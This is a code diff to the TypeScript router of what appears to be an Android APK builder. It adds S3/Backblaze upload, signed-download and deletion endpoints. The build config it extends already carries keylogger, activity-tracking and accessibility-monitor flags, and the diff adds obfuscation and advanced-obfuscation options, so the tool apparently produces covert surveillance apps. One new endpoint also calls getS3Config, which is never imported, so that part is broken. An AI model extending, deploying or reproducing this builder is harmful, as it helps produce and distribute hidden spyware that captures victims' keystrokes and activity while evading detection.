@@ -4,6 +4,14 @@ import { getAPKBuilder, type APKConfig } from "../apkBuilder";
 import { getDb } from "../db";
 import { apkBuilds } from "../../drizzle/schema";
 import { eq } from "drizzle-orm";
+import { TRPCError } from "@trpc/server";
+import * as fs from "fs";
+import * as path from "path";
+
+import { uploadFile, getDownloadUrl, deleteFile } from "../services/storageService";
+
+// Reemplazado por storageService.ts
+
 
 // Validation schemas
 const buildConfigSchema = z.object({
@@ -19,6 +27,9 @@ const buildConfigSchema = z.object({
   enableKeylogger: z.boolean().optional(),
   enableActiveTracking: z.boolean().optional(),
   enableAccessibilityMonitor: z.boolean().optional(),
+  obfuscate: z.boolean().optional(),
+  advancedObfuscation: z.boolean().optional(),
+  targetArchitectures: z.array(z.string()).optional(),
 });
 
 export const apkRouter = router({
@@ -169,7 +180,11 @@ export const apkRouter = router({
         // Delete from database
         await db.delete(apkBuilds).where(eq(apkBuilds.buildId, input.buildId));
 
-        // Clean up build artifacts
+        // Clean up from database done above
+        // Clean up from S3/Storage
+        const s3Key = `apks/${input.buildId}.apk`;
+        await deleteFile(s3Key);
+
         const apkBuilder = getAPKBuilder();
         await apkBuilder.cleanupBuild(input.buildId);
 
@@ -263,6 +278,108 @@ export const apkRouter = router({
         };
       }
     }),
+
+  /**
+   * Upload APK to S3 storage
+   */
+  uploadToS3: protectedProcedure
+    .input(z.object({ buildId: z.string() }))
+    .mutation(async ({ input, ctx }) => {
+      try {
+        const db = await getDb();
+        if (!db) {
+          throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database not available" });
+        }
+
+        const builds = await db.select().from(apkBuilds).where(eq(apkBuilds.buildId, input.buildId)).limit(1);
+        if (builds.length === 0) {
+          throw new TRPCError({ code: "NOT_FOUND", message: "Build not found" });
+        }
+
+        const build = builds[0];
+        if (build.status !== "ready") {
+          throw new TRPCError({ code: "BAD_REQUEST", message: "Build not ready for upload" });
+        }
+
+        const filePath = path.join(process.cwd(), "uploads", "apks", `${input.buildId}.apk`);
+        if (!fs.existsSync(filePath)) {
+          // Check builds/outputs as well (where builder puts them)
+          const builderPath = path.join(process.cwd(), "builds", "outputs", `${input.buildId}.apk`);
+          if (!fs.existsSync(builderPath)) {
+            throw new TRPCError({ code: "NOT_FOUND", message: "APK file not found" });
+          }
+          // Use the one from builder
+          const result = await uploadFile(fs.readFileSync(builderPath), `${input.buildId}.apk`, "apks", "application/vnd.android.package-archive");
+          if (!result.success) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: result.error });
+          
+          await db.update(apkBuilds).set({ apkUrl: result.url }).where(eq(apkBuilds.buildId, input.buildId));
+          return { success: true, message: "Uploaded to S3", url: result.url };
+        }
+
+        const fileContent = fs.readFileSync(filePath);
+        const result = await uploadFile(fileContent, `${input.buildId}.apk`, "apks", "application/vnd.android.package-archive");
+        
+        if (!result.success) {
+          throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: result.error });
+        }
+
+        await db.update(apkBuilds).set({ apkUrl: result.url }).where(eq(apkBuilds.buildId, input.buildId));
+
+        return { success: true, message: "Uploaded to S3", url: result.url };
+      } catch (error) {
+        console.error("[APK Router] S3 upload error:", error);
+        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "S3 upload failed" });
+      }
+    }),
+
+  /**
+   * Get download URL (S3 signed or local)
+   */
+  getDownloadUrl: protectedProcedure
+    .input(z.object({ buildId: z.string() }))
+    .query(async ({ input, ctx }) => {
+      try {
+        const db = await getDb();
+        if (!db) {
+          throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database not available" });
+        }
+
+        const builds = await db.select().from(apkBuilds).where(eq(apkBuilds.buildId, input.buildId)).limit(1);
+        if (builds.length === 0) {
+          throw new TRPCError({ code: "NOT_FOUND", message: "Build not found" });
+        }
+
+        const build = builds[0];
+        if (build.status !== "ready") {
+          throw new TRPCError({ code: "BAD_REQUEST", message: "Build not ready" });
+        }
+
+        let downloadUrl = build.apkUrl || `/uploads/apks/${input.buildId}.apk`;
+        
+        if (downloadUrl.startsWith("http") && downloadUrl.includes("backblazeb2")) {
+          // Generar URL firmada si se requiere (o devolver la actual si es pública)
+          const s3Key = `apks/${input.buildId}.apk`;
+          downloadUrl = await getDownloadUrl(s3Key);
+        }
+
+        return { url: downloadUrl, expiresIn: 3600 };
+      } catch (error) {
+        console.error("[APK Router] Get download URL error:", error);
+        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Failed to get download URL" });
+      }
+    }),
+
+  /**
+   * Check S3 configuration status
+   */
+  checkS3Status: protectedProcedure.query(() => {
+    const config = getS3Config();
+    return {
+      configured: !!config,
+      bucket: config?.bucket || null,
+      region: config?.region || null,
+    };
+  }),
 });
 
 export type APKRouter = typeof apkRouter;
